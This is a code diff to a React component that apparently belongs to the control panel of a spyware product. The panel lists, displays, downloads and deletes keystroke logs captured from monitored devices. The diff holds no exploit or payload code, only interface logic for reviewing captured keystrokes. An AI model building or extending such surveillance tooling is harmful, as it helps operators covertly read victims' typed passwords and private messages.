@@ -2,33 +2,23 @@ import React, { useState, useEffect } from "react";
 import toast from "react-hot-toast";
 import { useTranslation } from "react-i18next";
 import { useMediaQuery } from "react-responsive";
-import { Typography, Box, Tooltip, CardMedia } from "@mui/material";
+import { Typography, CardMedia, Box, IconButton } from "@mui/material";
 
-import FileDownloadOutlinedIcon from "@mui/icons-material/FileDownloadOutlined";
-import ClearOutlinedIcon from "@mui/icons-material/ClearOutlined";
+import DownloadIcon from "@mui/icons-material/Download";
+import DeleteIcon from "@mui/icons-material/Delete";
 
 import { useSocketFunctions } from "../../utils/socket";
 import { useSocket } from "../../hooks/use-socket";
 import MonitorViewer from "../monitorViewer";
 import Color from "src/theme/colors";
-import { formatDate, formatDateTime } from "../../utils/common";
-
-import {
-  getOfflineKeyLogsList,
-  getOfflineKeylogContents,
-  downloadOfflineKeylogsFile,
-  removeKeyLogsFile,
-} from "src/store/actions/keylog.action";
+import { getOfflineKeyLogsList, removeKeyLogsFile } from "src/store/actions/keylog.action";
 
 const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
   const { t } = useTranslation();
-  const { onSocketMonitor } = useSocketFunctions();
-  const { socket } = useSocket();
+  const isMobile = useMediaQuery({ query: "(max-width: 475px)" });
   const isTablet = useMediaQuery({ query: "(max-width: 1024px) and (min-width: 476px)" }); // Tablet between 476px and 1024px
-
-  const [keylogsDateList, setKeyLogsDateList] = useState([]);
   const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);
-  const [selectedKeylog, setselectedKeylog] = useState(null);
+  const [selectedLog, setSelectedLog] = useState(null); // For storing the selected file content
 
   const [state, setState] = useState({
     width: 720,
@@ -71,15 +61,13 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
     init();
   }, [monitor]);
 
-  // Load Keylogs List
   const init = async () => {
     try {
       if (device) {
         const response = await getOfflineKeyLogsList({ deviceId: device?.deviceId });
-        if (response.status == 200 && response.dates.length > 0) {
-          setKeyLogsDateList(response.dates);
-        } else {
-          console.log("empty keylogs date list");
+
+        if (response && Array.isArray(response)) {
+          setRecieveKeyLogs(response);
         }
       }
     } catch (error) {
@@ -96,79 +84,30 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
     }
   };
 
-  // Select Keylog Date and Get content of a keylog
-  const onSelectKeyLogsDate = async (keylog) => {
-    setselectedKeylog(keylog);
-    try {
-      const deviceId = device?.deviceId;
-      const response = await getOfflineKeylogContents({ deviceId, keylog });
-      if (response.status == 200) {
-        setRecieveKeyLogs(response.keyLogContents);
-      } else {
-        toast.error(t("toast.error.server-error"), {
-          position: "bottom-center",
-          reverseOrder: false,
-          duration: 5000,
-          style: {
-            backgroundColor: Color.background.red_gray01,
-            borderRadius: "5px",
-            padding: "3px 10px",
-          },
-        });
-      }
-    } catch (error) {
-      toast.error(t("toast.error.server-error"), {
-        position: "bottom-center",
-        reverseOrder: false,
-        duration: 5000,
-        style: {
-          backgroundColor: Color.background.red_gray01,
-          borderRadius: "5px",
-          padding: "3px 10px",
-        },
-      });
-    }
+  const handleLogClick = (log) => {
+    setSelectedLog(log);
   };
 
   // Download Keylogs
-  const onKeyLogsDownload = async (date) => {
-    const deviceId = device?.deviceId;
-    const response = await downloadOfflineKeylogsFile({ deviceId, date });
-    console.log(response);
-    // Handle the blob response for file download
-    if (response) {
-      const blob = new Blob([response], { type: "text/plain" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = `keylogs_${deviceId}_${date}.txt`;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    } else {
-      toast.error(t("toast.error.server-error"), {
-        position: "bottom-center",
-        reverseOrder: false,
-        duration: 5000,
-        style: {
-          backgroundColor: Color.background.red_gray01,
-          borderRadius: "5px",
-          padding: "3px 10px",
-        },
-      });
-    }
+  const onKeyLogsDownload = (filename, content) => {
+    const blob = new Blob([content], { type: "text/plain" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = filename;
+    link.click();
   };
 
   // Remove keylogs file
-  const onKeyLogFilesRemove = async (date) => {
+  const onKeyLogFilesRemove = async (filename) => {
     const deviceId = device?.deviceId;
 
     const res = await removeKeyLogsFile({
       deviceId,
-      date,
+      filename,
     });
 
     if (res?.status === 200) {
-      toast.success(`${date} ${t("toast.success.keylog-remove")}`, {
+      toast.success(`${filename} ${t("toast.success.keylog-remove")}`, {
         position: "bottom-center",
         reverseOrder: false,
         duration: 5000,
@@ -180,12 +119,13 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
         },
       });
 
-      // Remove the file from the keylogs date list
-      setKeyLogsDateList((prevLogs) => prevLogs.filter((logDate) => logDate !== date));
+      // Remove the file from the state
+      setRecieveKeyLogs((prevLogs) => prevLogs.filter((log) => log.filename !== filename));
 
-      if (selectedKeylog === date) {
-        setRecieveKeyLogs([]);
-        setselectedKeylog(null);
+      setSelectedLog(null);
+      // Clear the selection if the removed file was selected
+      if (selectedLog && selectedLog.filename === filename) {
+        setSelectedLog(null);
       }
     } else {
       toast.error(t("toast.error.server-error"), {
@@ -203,7 +143,7 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
 
   const onCloseModal = () => {
     setRecieveKeyLogs([]);
-    setselectedKeylog(null);
+    setSelectedLog(null);
     onClose(false);
   };
 
@@ -235,15 +175,15 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
         {/* Left part: List of TXT files */}
         <Box
           sx={{
-            width: { md: "30%", xs: "100%" },
-            borderRight: `1px solid ${Color.background.border}`,
-            height: { md: "100%", xs: "50%" },
+            width: !isMobile ? "30%" : "100%",
+            height: !isMobile ? "100%" : "50%",
             overflowY: "auto",
-            p: 1,
+            px: 1,
+            py: isMobile ? 5 : 1,
             border: `solid 1px ${Color.background.border}`,
           }}
         >
-          {keylogsDateList.length === 0 ? (
+          {recieveKeyLogs.length === 0 ? (
             <Box
               sx={{
                 display: "flex",
@@ -263,70 +203,72 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
               </Typography>
             </Box>
           ) : (
-            keylogsDateList.map((date, index) => (
-              <Box
-                key={index}
-                onClick={() => onSelectKeyLogsDate(date)}
-                sx={{
-                  display: "flex",
-                  justifyContent: "space-between",
-                  alignItems: "center",
-                  px: "5px",
-                  py: "2px",
-                  mb: "5px",
-                  border: `solid 1px ${
-                    date === selectedKeylog ? Color.background.purple : Color.background.main
-                  }`,
-                  backgroundColor:
-                    date === selectedKeylog ? Color.background.purple_opacity : "none",
-                  "&:hover": {
-                    backgroundColor: Color.background.purple_opacity,
-                  },
-                }}
-              >
-                <Typography
+            recieveKeyLogs
+              .sort((a, b) => {
+                const dateA = new Date(a.filename.split(".")[0]); // Extract date from filename
+                const dateB = new Date(b.filename.split(".")[0]);
+                return dateB - dateA;
+              })
+              .map((log, index) => (
+                <Box
+                  key={index}
+                  onClick={() => handleLogClick(log)}
                   sx={{
-                    width: "100%",
-                    cursor: "default",
-                    color: date === selectedKeylog ? Color.text.primary : Color.text.primary,
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                    px: "5px",
+                    py: "2px",
+                    mb: "5px",
+                    backgroundColor: log === selectedLog ? Color.background.purple_opacity : "none",
+                    "&:hover": {
+                      backgroundColor: Color.background.purple_opacity,
+                    },
                   }}
                 >
-                  {formatDate(date)}
-                </Typography>
+                  <Typography
+                    sx={{
+                      width: "100%",
+                      cursor: "default",
+                      color: log === selectedLog ? Color.text.primary : Color.text.primary,
+                    }}
+                  >
+                    {log.filename}
+                  </Typography>
 
-                {/* Icons: Download and Remove */}
-                <Box sx={{ display: "flex", alignItems: "center", gap: "7px" }}>
-                  <Tooltip title={t("devicesPage.deviceInfo.download")} placement="top">
-                    <FileDownloadOutlinedIcon
-                      onClick={() => onKeyLogsDownload(date)}
+                  {/* Icons: Download and Remove */}
+                  <Box sx={{ display: "flex", alignItems: "center", gap: "7px" }}>
+                    <DownloadIcon
+                      onClick={() => onKeyLogsDownload(log.filename, log.content)}
                       sx={{
-                        color: Color.text.purple,
+                        color: Color.background.purple,
+                        border: `solid 1px ${Color.background.purple}`,
                         fontSize: "20px",
                         cursor: "pointer",
                         "&:hover": {
-                          color: Color.text.primary,
+                          color: "inherit",
+                          backgroundColor: Color.background.purple,
                         },
                       }}
                     />
-                  </Tooltip>
 
-                  {/* Delete Icon */}
-                  <Tooltip title={t("devicesPage.deviceInfo.remove-file")} placement="top">
-                    <ClearOutlinedIcon
-                      onClick={() => onKeyLogFilesRemove(date)}
+                    {/* Delete Icon */}
+                    <DeleteIcon
+                      onClick={() => onKeyLogFilesRemove(log.filename)}
                       sx={{
                         color: Color.background.red_gray01,
+                        border: `solid 1px ${Color.background.red_gray01}`,
                         fontSize: "20px",
                         cursor: "pointer",
                         "&:hover": {
-                          color: Color.background.red_gray02,
+                          color: "inherit",
+                          backgroundColor: Color.background.red_gray01,
                         },
                       }}
                     />
-                  </Tooltip>
+                  </Box>
                 </Box>
-              </Box>
-            ))
+              ))
           )}
         </Box>
 
@@ -343,38 +285,10 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
             borderRadius: "5px",
           }}
         >
-          {recieveKeyLogs.length > 0 ? (
+          {selectedLog ? (
             <Box>
-              <Typography variant="h6">{selectedKeylog}</Typography>
-              {recieveKeyLogs.map((logs, index) => (
-                <Box
-                  key={index}
-                  sx={{
-                    color: Color.text.secondary,
-                    display: "flex",
-                    justifyContent: "flex-start",
-                  }}
-                >
-                  <Typography component="span" sx={{ color: Color.text.secondary }}>
-                    {formatDateTime(logs?.created_at)}
-                  </Typography>
-                  {"  "}
-                  <Typography
-                    component="span"
-                    sx={{ color: Color.text.purple_light, fontWeight: 600, ml: 1 }}
-                  >
-                    {logs?.keylogs}
-                  </Typography>
-                  {"  "}
-                  <Typography component="span" sx={{ color: Color.text.secondary, ml: 2 }}>
-                    {logs?.keyLogsType}
-                  </Typography>
-                  {" / "}
-                  <Typography component="span" sx={{ color: Color.text.secondary, ml: 2 }}>
-                    {logs?.keyevent}
-                  </Typography>
-                </Box>
-              ))}
+              <Typography variant="h6">{selectedLog.filename.replace(".txt", "")}</Typography>
+              <pre>{selectedLog.content}</pre>
             </Box>
           ) : (
             <Box
@@ -382,15 +296,13 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
                 width: "100%",
                 height: "100%",
                 display: "flex",
-                justifyContent: "center",
                 alignItems: "center",
+                justifyContent: "center",
               }}
             >
-              <CardMedia
-                component="img"
-                src="/assets/logos/spy/ghostspy-logo-_2_.webp"
-                sx={{ cursor: "default", width: "auto", height: "auto" }}
-              />
+              <Typography sx={{ fontSize: "14px", color: Color.text.secondary }}>
+                {t("devicesPage.monitors.offline-keylog-content-empty")}
+              </Typography>
             </Box>
           )}
         </Box>
